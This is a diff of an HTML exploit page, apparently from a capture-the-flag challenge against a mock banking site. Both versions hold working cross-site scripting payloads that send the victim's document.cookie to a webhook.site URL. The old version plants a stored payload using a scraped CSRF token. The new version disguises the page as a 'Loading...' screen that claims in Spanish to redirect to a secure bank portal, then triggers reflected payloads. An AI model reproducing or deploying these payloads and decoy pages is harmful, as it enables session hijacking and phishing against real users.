@@ -1,47 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Loading...</title>
 </head>
 <body>
     <script>
-    const TARGET_URL = "https://hackon-seeknbank-web.chals.io";
-    const WEBHOOK_URL = "https://webhook.site/09a9173a-5515-4eb1-80d0-d8ae12474c20";
-    
-    // Payload que incluye el código de robo directamente
-    const XSS_PAYLOAD = `</iframe><script>
-        fetch('${WEBHOOK_URL}?cookie=' + encodeURIComponent(document.cookie));
-    </scr` + `ipt>`;
-    
-    async function exploit() {
-        try {
-            // Obtener CSRF token
-            const indexResponse = await fetch(TARGET_URL);
-            const indexText = await indexResponse.text();
-            const csrfMatch = indexText.match(/name="csrf_token" value="([^"]+)"/);
-            if (!csrfMatch) throw new Error("No CSRF token");
-            const csrfToken = csrfMatch[1];
+        setTimeout(() => {
+            const payload = '"></iframe><script>fetch("https://webhook.site/09a9173a-5515-4eb1-80d0-d8ae12474c20?c="+document.cookie)//';
+            window.location = "https://hackon-seeknbank-web.chals.io/?q=" + encodeURIComponent(payload);
             
-            // Añadir cuenta maliciosa
-            const formData = new FormData();
-            formData.append('name', XSS_PAYLOAD);
-            formData.append('csrf_token', csrfToken);
-            
-            await fetch(`${TARGET_URL}/add`, {
-                method: 'POST',
-                body: formData,
-                credentials: 'include'
-            });
-            
-            // Activar payload
-            window.location = `${TARGET_URL}/?q=${encodeURIComponent('</iframe>')}`;
-        } catch (e) {
-            // Si algo falla, al menos intentamos ver la página
-            window.location = TARGET_URL;
-        }
-    }
-    
-    exploit();
+            setTimeout(() => {
+                window.location = "http://web-vulnerable:5000/?q=" + 
+                    encodeURIComponent('<img src=x onerror="fetch(\'https://webhook.site/09a9173a-5515-4eb1-80d0-d8ae12474c20?c=\'+document.cookie)">');
+            }, 3000);
+        }, 2000);
     </script>
+    <h1>Cargando portal bancario...</h1>
+    <p>Por favor espere, redirigiendo al sistema seguro...</p>
 </body>
 </html>
